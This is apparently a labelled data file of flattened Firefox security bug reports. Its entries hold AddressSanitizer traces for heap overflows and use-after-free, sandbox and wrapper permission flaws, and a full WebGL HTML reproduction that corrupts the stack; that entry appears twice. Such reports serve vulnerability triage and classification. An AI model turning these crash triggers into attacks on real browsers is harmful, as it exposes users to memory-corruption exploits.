showasmodal src/xpfe/appshell/src/nscontenttreeowner.cpp:529 19 in non-virtual thunk to nscontenttreeowner showasmodal asn1cmn.c:0 20 in nswindowwatcher openwindowjsinternal nsidomwindow char const char const char const bool nsiarray bool nsidomwindow src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:996 21 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:381 22 in nsnssdialoghelper opendialog nsidomwindow char const nsisupports bool src/security/manager/pki/src/nsnssdialoghelper.cpp:44 23 in nsnssdialogs displaygeneratingkeypairinfo nsiinterfacerequestor nsikeygenthread src/security/manager/pki/src/nsnssdialogs.cpp:457 24 in non-virtual thunk to nsnssdialogs displaygeneratingkeypairinfo nsiinterfacerequestor nsikeygenthread asn1cmn.c:0 25 in nskeygenformprocessor getpublickey nsastring_internal nsastring_internal nsstring nsastring_internal nsastring_internal src/security/manager/ssl/src/nskeygenhandler.cpp:658 26 in nskeygenformprocessor processvalue nsidomhtmlelement nsastring_internal const nsastring_internal src/security/manager/ssl/src/nskeygenhandler.cpp:800 27 in nshtmlselectelement submitnamesvalues nsformsubmission src/content/html/content/src/nshtmlselectelement.cpp:1771 28 in non-virtual thunk to nshtmlselectelement submitnamesvalues nsformsubmission asn1cmn.c:0 29 in nshtmlformelement walkformelements nsformsubmission src/content/html/content/src/nshtmlformelement.cpp:983 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in ns_newhtmlselectelement already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/content/src/nshtmlselectelement.cpp:104 3 in createhtmlelement unsigned int already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/document/src/nshtmlcontentsink.cpp:497 4 in ns_newhtmlelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/document/src/nshtmlcontentsink.cpp:480 5 in ns_newelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/base/src/nsnamespacemanager.cpp:201 6 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent src/parser/html/nshtml5treeoperation.cpp:340 7 in nshtml5treeopexecutor runflushloop src/parser/html/nshtml5treeopexecutor.cpp:566 8 in nshtml5executorflusher run src/parser/html/nshtml5streamparser.cpp:127 9 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:625 10 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 11 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 12 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:209 13 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:202 14 in messageloop run src/ipc/chromium/src/base/message_loop.cc:176 15 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:165 16 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:257 17 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3787 18 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3864 19 in xre_main src/toolkit/xre/nsapprunner.cpp:3940 20 in do_main int char src/browser/app/nsbrowserapp.cpp:160 21 in main src/browser/app/nsbrowserapp.cpp:298 22 in 0 2410 aborting stats 222m malloced 260m for red zones by 614296 calls stats 50m realloced by 30116 calls stats 191m freed by 382570 calls stats 58m really freed by 173153 calls stats 464m 118841 full pages mmaped in 116 calls mmaps by size class 8:425958 9:57337 10:65520 11:20470 12:4096 13:3072 14:1536 15:384 16:640 17:160 18:224 19:48 20:12 mallocs by size class 8:452010 9:59723 10:72170 11:20208 12:3653 13:3340 14:1706 15:411 16:629 17:148 18:238 19:47 20:13 frees by size class 8:237578 9:50565 10:68846 11:17073 12:2672 13:3053 14:1487 15:360 16:531 17:134 18:218 19:43 20:10 rfrees by size class 8:129647 9:23124 10:8778 11:8941 12:816 13:545 14:723 15:159 16:342 17:52 18:21 19:4 20:1 stats malloc large 446 small slow 2990 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa	11
stack scribbling with 4-byte values choosable among a few values when using more than 16 sampler uniforms on mesa with all drivers user agent mozilla/5.0 macintosh intel mac os x 10_7_4 applewebkit/536.11 khtml like gecko chrome/20.0.1132.57 safari/536.11 steps to reproduce on linux with decoders asan opt nightly build i loaded html head script id vshader type x-shader/x-vertex void main vec4 x gl_position x script script id fshader type x-shader/x-fragment precision mediump float uniform sampler2d uni 29 void main vec4 c for int i 0 i 2 i c texture2d uni i vec2 0 script script function loadshaderfromscript gl name shadertype var shader gl.createshader shadertype var shadersource document.getelementbyid name text gl.shadersource shader shadersource gl.compileshader shader return shader onload function var gl document.createelement canvas getcontext moz-webgl var program gl.createprogram gl.attachshader program loadshaderfromscript gl vshader gl.vertex_shader gl.attachshader program loadshaderfromscript gl fshader gl.fragment_shader gl.linkprogram program script head body body html actual results 7388 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in 0 18352 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 29536 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in 0 i have seen these three asan outputs they depend on the number on this line uniform sampler2d uni 29 29 is the lower bound 65535 is the upper bound	11
stack scribbling with 4-byte values choosable among a few values when using more than 16 sampler uniforms on mesa with all drivers user agent mozilla/5.0 macintosh intel mac os x 10_7_4 applewebkit/536.11 khtml like gecko chrome/20.0.1132.57 safari/536.11 steps to reproduce on linux with decoders asan opt nightly build i loaded html head script id vshader type x-shader/x-vertex void main vec4 x gl_position x script script id fshader type x-shader/x-fragment precision mediump float uniform sampler2d uni 29 void main vec4 c for int i 0 i 2 i c texture2d uni i vec2 0 script script function loadshaderfromscript gl name shadertype var shader gl.createshader shadertype var shadersource document.getelementbyid name text gl.shadersource shader shadersource gl.compileshader shader return shader onload function var gl document.createelement canvas getcontext moz-webgl var program gl.createprogram gl.attachshader program loadshaderfromscript gl vshader gl.vertex_shader gl.attachshader program loadshaderfromscript gl fshader gl.fragment_shader gl.linkprogram program script head body body html actual results 7388 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in 0 18352 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 29536 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in 0 i have seen these three asan outputs they depend on the number on this line uniform sampler2d uni 29 29 is the lower bound 65535 is the upper bound	11
heap-use-after-free in presshell completemove reproduces on trunk 11961 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in nsinode getboolflag nsinode booleanflag const src dist/include/nsinode.h:1315 1 in nsinode isindoc const src dist/include/nsinode.h:449 2 in nsicontent getprimaryframe const src dist/include/nsicontent.h:821 3 in presshell completemove bool bool src/layout/base/nspresshell.cpp:2203 4 in non-virtual thunk to presshell completemove bool bool asn1cmn.c:0 5 in mozilla selection modify nsastring_internal const nsastring_internal const nsastring_internal const src/layout/generic/nsselection.cpp:5528 6 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 7 in callmethodhelper call src/js/xpconnect/src/xpcwrappednative.cpp:2416 8 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1474 9 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:382 10 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2424 11 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:302 12 in js executekernel jscontext jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:488 13 in js execute jscontext jsscript jsobject js value src/js/src/jsinterp.cpp:525 14 in evaluateucscriptforprincipalscommon jscontext jsobject jsprincipals jsprincipals unsigned short const unsigned int char const unsigned int js value jsversion src/js/src/jsapi.cpp:5439 15 in js_evaluateucscriptforprincipalsversionorigin src/js/src/jsapi.cpp:5476 16 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1487 17 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9542 18 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9803 19 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10071 20 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:474 21 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:558 22 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:625 23 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 24 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:117 25 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:209 26 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:202 27 in messageloop run src/ipc/chromium/src/base/message_loop.cc:176 28 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:165 29 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:271 30 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3798 31 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3875 32 in xre_main src/toolkit/xre/nsapprunner.cpp:3951 33 in do_main int char src/browser/app/nsbrowserapp.cpp:174 34 in main src/browser/app/nsbrowserapp.cpp:312 35 in 0 is located 44 bytes inside of 128-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:49 2 in nshtmlbodyelement src/content/html/content/src/nshtmlbodyelement.cpp:279 3 in nsnodeutils lastrelease nsinode src/content/base/src/nsnodeutils.cpp:252 4 in nsgenericelement release src/content/base/src/nsgenericelement.cpp:3509 5 in nshtmlbodyelement release src/content/html/content/src/nshtmlbodyelement.cpp:283 6 in zl17dodeferredreleaseip11nsisupportsevr8nstarrayit_24nstarraydefaultallocatore src/js/xpconnect/src/xpcjsruntime.cpp:563 7 in xpcjsruntime gccallback jsruntime jsgcstatus src/js/xpconnect/src/xpcjsruntime.cpp:598 8 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4016 9 in js gcslice jsruntime js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4044 10 in js incrementalgc jsruntime js gcreason reason src/js/src/jsfriendapi.cpp:168 11 in nsjscontext garbagecollectnow js gcreason reason nsjscontext isincremental nsjscontext iscompartment nsjscontext isshrinking src/dom/base/nsjsenvironment.cpp:2918 12 in gctimerfired nsitimer void src/dom/base/nsjsenvironment.cpp:3214 13 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:474 14 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:558 15 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:625 16 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 17 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:117 18 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:209 19 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:202 20 in messageloop run src/ipc/chromium/src/base/message_loop.cc:176 21 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:165 22 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:271 23 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3798 24 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3875 25 in xre_main src/toolkit/xre/nsapprunner.cpp:3951 26 in do_main int char src/browser/app/nsbrowserapp.cpp:174 27 in main src/browser/app/nsbrowserapp.cpp:312 28 in 0 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in ns_newhtmlbodyelement already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/content/src/nshtmlbodyelement.cpp:264 3 in createhtmlelement unsigned int already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/document/src/nshtmlcontentsink.cpp:497 4 in ns_newhtmlelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/document/src/nshtmlcontentsink.cpp:480 5 in ns_newelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/base/src/nsnamespacemanager.cpp:201 6 in nsdocument createelementns nsastring_internal const nsastring_internal const nsicontent src/content/base/src/nsdocument.cpp:4410 7 in nsidomdocument_createelementns jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3242 8 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:382 9 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2424 10 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:302 11 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:356 12 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 13 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:388 14 in js_callfunctionvalue src/js/src/jsapi.cpp:5569 15 in nsjscontext calleventhandler nsisupports jsobject jsobject nsiarray nsivariant src/dom/base/nsjsenvironment.cpp:1907 16 in nsjseventlistener handleevent nsidomevent src/dom/src/events/nsjseventlistener.cpp:188 17 in nseventlistenermanager handleeventsubtype nslistenerstruct nsidomeventlistener nsidomevent nsidomeventtarget unsigned int nscxpusher src/content/events/src/nseventlistenermanager.cpp:794 18 in nseventlistenermanager handleeventinternal nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher src/content/events/src/nseventlistenermanager.cpp:867 19 in nseventlistenermanager handleevent nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher src/content/events/src/nseventlistenermanager.h:144 20 in nseventtargetchainitem handleevent nseventchainpostvisitor unsigned int bool nscxpusher src/content/events/src/nseventdispatcher.cpp:184 21 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher src/content/events/src/nseventdispatcher.cpp:312 22 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray nsidomeventtarget src/content/events/src/nseventdispatcher.cpp:633 23 in documentviewerimpl loadcomplete unsigned int src/layout/base/nsdocumentviewer.cpp:1017 24 in nsdocshell endpageload nsiwebprogress nsichannel unsigned int src/docshell/base/nsdocshell.cpp:6300 11961 aborting stats 261m malloced 268m for red zones by 547279 calls stats 87m realloced by 38827 calls stats 230m freed by 421350 calls stats 99m really freed by 214956 calls stats 444m 113737 full pages mmaped in 111 calls mmaps by size class 8:294894 9:57337 10:20475 11:16376 12:4096 13:3584 14:1536 15:384 16:512 17:128 18:272 19:112 20:40 mallocs by size class 8:425683 9:65265 10:24573 11:20475 12:3931 13:3838 14:1797 15:448 16:637 17:146 18:323 19:118 20:45 frees by size class 8:315274 9:56823 10:21534 11:17730 12:3193 13:3642 14:1616 15:395 16:575 17:120 18:298 19:109 20:41 rfrees by size class 8:164321 9:27420 10:9917 11:10072 12:968 13:626 14:933 15:164 16:340 17:69 18:56 19:47 20:23 stats malloc large 632 small slow 2649 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
out of bounds read in str_unescape i ran into this issue while fuzzing asan reports this as a heap overflow i was n't able to symbolize the asan output for some unknown reason however i see it crashing at strange locations on different runs on optimized builds in debug builds it hits this assertion and crashes null assertion failure mlength 1 mreserved at dist/include/js/vector.h:788 windbg references this code mozjs str_unescape e builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp 352 i have attached some logs from both debug and optimized builds	11
xhr created from sandboxes end up having system principal instead of principal of the sandbox i have not yet tested this just noticed the change in nsxhr init method it is now using system principal while previously it was using the current principal fetched from the context stack if i m not mistaken that has been removed createxmlhttprequest method in xpccomponents.cpp should create an xhr object with the principal of the sandbox	2
chromeobjectwrapper is not implemented as intended after bug 760109 landing content still can access properties of a standard prototype from a chrome scope if exposedprops does n't exist 67 chromeobjectwrapper get jscontext cx jsobject wrapper jsobject receiver 68 jsid id js value vp 69 70 try the lookup on the base wrapper 71 if chromeobjectwrapperbase get cx wrapper receiver id vp 72 return false 73 74 if we found something or have no proto we re done 75 jsobject wrapperproto js_getprototype wrapper 76 if vp isundefined wrapperproto 77 return true chromeobjectwrapperbase get lookups the chrome object s prototype chain and can find something on a standard prototype from the chrome scope	2
out-of-bounds-read in chardistributionanalysis handleonechar reproduces on trunk 30575 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in chardistributionanalysis handleonechar char const unsigned int firefox/src/extensions/universalchardet/src/base/chardistribution.h:37 1 in nseuctwprober handledata char const unsigned int firefox/src/extensions/universalchardet/src/base/nseuctwprober.cpp:41 2 in nsmbcsgroupprober handledata char const unsigned int firefox/src/extensions/universalchardet/src/base/nsmbcsgroupprober.cpp:125 3 in nsuniversaldetector handledata char const unsigned int firefox/src/extensions/universalchardet/src/base/nsuniversaldetector.cpp:181 4 in nsxpcomdetector doit char const unsigned int bool firefox/src/extensions/universalchardet/src/xpcom/nsudetxpcomwrapper.cpp:57 5 in non-virtual thunk to nsxpcomdetector doit char const unsigned int bool asn1cmn.c:0 6 in nscontentutils guesscharset char const unsigned int nsacstring_internal firefox/src/content/base/src/nscontentutils.cpp:3628 7 in nsdomfilereader getastext nsacstring_internal const char const unsigned int nsastring_internal firefox/src/content/base/src/nsdomfilereader.cpp:444 8 in nsdomfilereader doonstoprequest nsirequest nsisupports unsigned int nsastring_internal nsastring_internal firefox/src/content/base/src/nsdomfilereader.cpp:357 9 in mozilla dom fileioobject onstoprequest nsirequest nsisupports unsigned int firefox/src/content/base/src/fileioobject.cpp:206 10 in non-virtual thunk to mozilla dom fileioobject onstoprequest nsirequest nsisupports unsigned int asn1cmn.c:0 11 in nsbasechannel onstoprequest nsirequest nsisupports unsigned int firefox/src/netwerk/base/src/nsbasechannel.cpp:720 12 in non-virtual thunk to nsbasechannel onstoprequest nsirequest nsisupports unsigned int asn1cmn.c:0 13 in nsinputstreampump onstatestop firefox/src/netwerk/base/src/nsinputstreampump.cpp:556 14 in nsinputstreampump oninputstreamready nsiasyncinputstream firefox/src/netwerk/base/src/nsinputstreampump.cpp:373 15 in non-virtual thunk to nsinputstreampump oninputstreamready nsiasyncinputstream asn1cmn.c:0 16 in nsinputstreamreadyevent run firefox/src/xpcom/io/nsstreamutils.cpp:82 17 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 18 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 19 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 20 in messageloop runinternal firefox/src/ipc/chromium/src/base/message_loop.cc:209 21 in messageloop runhandler firefox/src/ipc/chromium/src/base/message_loop.cc:202 22 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 23 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 24 in nsappstartup run firefox/src/toolkit/components/startup/nsappstartup.cpp:271 25 in xremain xre_mainrun firefox/src/toolkit/xre/nsapprunner.cpp:3798 26 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3875 27 in xre_main firefox/src/toolkit/xre/nsapprunner.cpp:3951 28 in do_main int char firefox/src/browser/app/nsbrowserapp.cpp:174 29 in main firefox/src/browser/app/nsbrowserapp.cpp:279 30 in 0 is located 30 bytes to the right of global variable euctwchartofreqorder firefox/src/extensions/universalchardet/src/base/chardistribution.cpp of size 10752 30575 aborting stats 238m malloced 252m for red zones by 382140 calls stats 42m realloced by 19486 calls stats 199m freed by 250896 calls stats 66m really freed by 170600 calls stats 440m 112717 full pages mmaped in 110 calls mmaps by size class 8:278511 9:40955 10:16380 11:14329 12:2048 13:2048 14:1280 15:256 16:448 17:1280 18:128 19:40 20:16 mallocs by size class 8:297871 9:44986 10:15483 11:15613 12:2123 13:2131 14:1393 15:307 16:536 17:1485 18:150 19:48 20:14 frees by size class 8:183583 9:36302 10:12152 11:12696 12:1450 13:1216 14:1203 15:254 16:453 17:1472 18:59 19:45 20:11 rfrees by size class 8:135364 9:18346 10:7215 11:7785 12:438 13:437 14:235 15:144 16:339 17:256 18:29 19:11 20:1 stats malloc large 1697 small slow 1873 shadow byte and word f9 f9 f9 f9 f9 00 00 00 00 more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00	11
heap-buffer-overflow in nssvgfemorphologyelement filter asan detected heap-buffer-overflow on opt build f24229bc0ec8	11
error error permission denied to access property tostring when open certain site this appears in aurora16.0a2 and nightly17.0a1 the appearance of the page does not seem to have the problem in particular step to reproduce 1 load actual results the following error shown in error console error permission denied to access property tostring	11
assertion this only works on nsisupports classes and segfault running new worker instanceof components.interfaces.nsiarray in a mochitest will hit ns_assertion mozilla dom domjsclass fromjsclass js getobjectjsclass obj mdomobjectisisupports this only works on nsisupports classes at 484 we then unwrap the object to nsisupports and try to call queryinterface on it and segfault in nswrappercache wrapobject	2
heap-buffer-overflow in gfxtextrun shrinktoligatureboundaries reproduces on trunk 12169 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in gfxshapedword compressedglyph isligaturegroupstart const src dist/include/gfxfont.h:1897 1 in gfxtextrun shrinktoligatureboundaries unsigned int unsigned int src/gfx/thebes/gfxfont.cpp:4555 2 in gfxtextrun breakandmeasuretext unsigned int unsigned int bool double gfxtextrun propertyprovider bool double gfxfont runmetrics gfxfont boundingboxtype gfxcontext bool unsigned int bool gfxbreakpriority src/gfx/thebes/gfxfont.cpp:4946 3 in nstextframe reflowtext nslinelayout int nsrenderingcontext bool nshtmlreflowmetrics unsigned int src/layout/generic/nstextframethebes.cpp:7785 4 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:829 5 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:680 6 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:543 7 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:397 8 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:822 9 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:680 10 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:543 11 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:397 12 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:822 13 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:680 14 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:543 15 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:397 16 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:822 17 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus src/layout/generic/nsblockframe.cpp:3835 18 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool src/layout/generic/nsblockframe.cpp:3631 19 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3483 20 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2571 21 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2021 22 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1070 23 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:268 24 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3207 25 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2515 26 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2021 27 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1070 28 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:946 29 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscanvasframe.cpp:463 30 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:946 31 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool src/layout/generic/nsgfxscrollframe.cpp:523 32 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const src/layout/generic/nsgfxscrollframe.cpp:623 33 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsgfxscrollframe.cpp:864 34 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:946 35 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsviewportframe.cpp:200 36 in presshell doreflow nsiframe bool src/layout/base/nspresshell.cpp:7430 37 in presshell processreflowcommands bool src/layout/base/nspresshell.cpp:7577 38 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3898 39 in nsrefreshdriver notify nsitimer src/layout/base/nsrefreshdriver.cpp:398 40 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:476 41 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 42 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 43 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 44 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 45 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 46 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 47 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 48 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 49 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 50 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3800 51 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3877 52 in xre_main src/toolkit/xre/nsapprunner.cpp:3953 53 in do_main int char src/browser/app/nsbrowserapp.cpp:174 54 in main src/browser/app/nsbrowserapp.cpp:279 55 in 0 is located 4 bytes to the right of 124-byte region allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_malloc src/memory/mozalloc/mozalloc.cpp:67 2 in gfxtextrun allocatestoragefortextrun unsigned long unsigned int src/gfx/thebes/gfxfont.cpp:4302 3 in gfxtextrun create gfxtextrunfactory parameters const unsigned int gfxfontgroup unsigned int src/gfx/thebes/gfxfont.cpp:4319 4 in gfxfontgroup makespacetextrun gfxtextrunfactory parameters const unsigned int src/gfx/thebes/gfxfont.cpp:3311 5 in gfxfontgroup maketextrun unsigned char const unsigned int gfxtextrunfactory parameters const unsigned int src/gfx/thebes/gfxfont.cpp:3355 6 in gfxtextrun maketextrun unsigned char unsigned char const unsigned int gfxfontgroup gfxtextrunfactory parameters const 